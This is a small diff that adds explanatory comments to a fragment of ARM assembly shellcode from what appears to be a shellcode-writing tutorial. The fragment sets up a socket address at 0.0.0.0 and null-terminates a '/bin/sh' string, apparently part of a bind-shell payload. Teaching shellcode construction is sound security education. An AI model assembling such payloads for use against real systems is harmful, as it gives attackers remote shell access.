@@ -352,7 +352,9 @@ Here is an assembler version of the same program
 		@ initialize the sa struct, AF_INET, 0.0.0.0
 		adr r0, _sa
 		eor r2, r2, r2
+		@ replace the 0xff in the first word with 0x00
 		strb r2, [r0, #1]
+		@ set the ip address to 0.0.0.0
 		str r2, [r0, #4]
 		@ null terminate the /bin/sh string
 		strb r2, [r0, #15]
